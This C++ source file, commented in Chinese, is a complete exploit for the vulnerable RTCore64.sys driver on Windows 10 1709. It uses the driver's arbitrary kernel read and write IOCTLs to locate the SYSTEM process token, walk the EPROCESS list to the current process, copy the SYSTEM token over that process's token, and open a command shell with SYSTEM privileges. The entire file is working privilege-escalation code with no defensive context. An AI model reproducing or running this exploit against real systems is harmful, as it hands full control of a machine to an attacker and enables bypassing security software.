#include <Windows.h>
#include <cstdio>
#include <Psapi.h>

#define SymLinkName L"\\\\.\\RTCore64"

struct RTCORE64_MEMORY_READ_WRITE
{
    BYTE pad0[8];
    DWORD64 address;
    BYTE pad1[8];
    DWORD size;
    DWORD value;
    BYTE pad3[16];
};

// 利用 RTCore64.sys 的任意讀漏洞讀取 Kernel 記憶體
DWORD ReadMemoryPrimitive(HANDLE Device, DWORD Size, DWORD64 Address)
{
    RTCORE64_MEMORY_READ_WRITE MemoryRead {};
    MemoryRead.address = Address;
    MemoryRead.size = Size;

    DWORD BytesReturned;

    DeviceIoControl(Device, 0x80002048, &MemoryRead, sizeof(MemoryRead), &MemoryRead, sizeof(MemoryRead), &BytesReturned,
                    nullptr);

    return MemoryRead.value;
}

// 從指定 Kernel 記憶體中讀取 8 bytes
DWORD64 ReadMemoryDWORD64(HANDLE Device, DWORD64 Address)
{
    return ((DWORD64)(ReadMemoryPrimitive(Device, 4, Address + 4)) << 32) | ReadMemoryPrimitive(Device, 4, Address);
}

// 利用 RTCore64.sys 的任意寫漏洞寫入 Kernel 記憶體
VOID WriteMemoryPrimitive(HANDLE Device, DWORD Size, DWORD64 Address, DWORD Value)
{
    RTCORE64_MEMORY_READ_WRITE MemoryRead {};
    MemoryRead.address = Address;
    MemoryRead.size = Size;
    MemoryRead.value = Value;

    DWORD BytesReturned;

    DeviceIoControl(Device, 0x8000204c, &MemoryRead, sizeof(MemoryRead), &MemoryRead, sizeof(MemoryRead), &BytesReturned,
                    nullptr);
}

// 從指定 Kernel 記憶體中寫入 8 bytes
VOID WriteMemoryDWORD64(HANDLE Device, DWORD64 Address, DWORD64 Value)
{
    WriteMemoryPrimitive(Device, 4, Address, Value & 0xffffffff);
    WriteMemoryPrimitive(Device, 4, Address + 4, Value >> 32);
}

LPVOID GetBaseAddr(const char* drvname)
{
    LPVOID drivers[1024];
    DWORD cbNeeded;
    int nDrivers, i = 0;

    if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers))
    {
        char szDrivers[1024];
        nDrivers = cbNeeded / sizeof(drivers[0]);
        for (i = 0; i < nDrivers; i++)
        {
            if (GetDeviceDriverBaseNameA(drivers[i], (LPSTR)szDrivers, sizeof(szDrivers) / sizeof(szDrivers[0])))
            {
                if (strcmp(szDrivers, drvname) == 0)
                {
                    return drivers[i];
                }
            }
        }
    }
    return 0;
}

int main()
{
    // 取得 Device Handle
    const HANDLE Device = CreateFile(SymLinkName, GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);

    if (Device == INVALID_HANDLE_VALUE)
    {
        return 1;
    }

    // 取得 ntoskrnl.exe 的起始位址
    INT64 NtoskrnlBaseAddress = (INT64)GetBaseAddr("ntoskrnl.exe");

    // 1. 用 LoadLibrary 和 GetProcAddress 取得 PsInitialSystemProcess 的位址
    HMODULE Ntoskrnl = LoadLibraryW(L"ntoskrnl.exe");
    const DWORD64 PsInitialSystemProcessOffset =
        (DWORD64)(GetProcAddress(Ntoskrnl, "PsInitialSystemProcess")) - (DWORD64)Ntoskrnl;
    FreeLibrary(Ntoskrnl);
    const DWORD64 PsInitialSystemProcessAddress =
        ReadMemoryDWORD64(Device, NtoskrnlBaseAddress + PsInitialSystemProcessOffset);

    // Windows 10 1709 的 UniqueProcessId、ActiveProcessLinks、Token 分別在 EPROCESS 的 Offset 0x2e0、0x2e8、0x358
    const DWORD64 UniqueProcessIdOffset = 0x2e0;
    const DWORD64 ActiveProcessLinksOffset = 0x2e8;
    const DWORD64 TokenOffset = 0x358;

    // 2. 利用 RTCore64.sys 的任意讀漏洞讀取 System 的 EPROCESS Token
    const DWORD64 SystemProcessToken = ReadMemoryDWORD64(Device, PsInitialSystemProcessAddress + TokenOffset) & ~15;

    // 3. 迴圈找出當前 Process 的 EPROCESS 位址
    const DWORD64 CurrentProcessId = (DWORD64)GetCurrentProcessId();
    DWORD64 ProcessHead = PsInitialSystemProcessAddress + ActiveProcessLinksOffset;
    DWORD64 CurrentProcessAddress = ProcessHead;

    do
    {
        const DWORD64 ProcessAddress = CurrentProcessAddress - ActiveProcessLinksOffset;
        const DWORD64 UniqueProcessId = ReadMemoryDWORD64(Device, ProcessAddress + UniqueProcessIdOffset);
        if (UniqueProcessId == CurrentProcessId)
        {
            break;
        }
        CurrentProcessAddress = ReadMemoryDWORD64(Device, ProcessAddress + ActiveProcessLinksOffset);
    } while (CurrentProcessAddress != ProcessHead);

    CurrentProcessAddress -= ActiveProcessLinksOffset;

    // 4. 利用 RTCore64.sys 的任意寫漏洞寫入 System 的 EPROCESS Token
    // 竄改當前 Process 的 EPROCESS Token
    WriteMemoryDWORD64(Device, CurrentProcessAddress + TokenOffset, SystemProcessToken);

    system("cmd");
    CloseHandle(Device);
}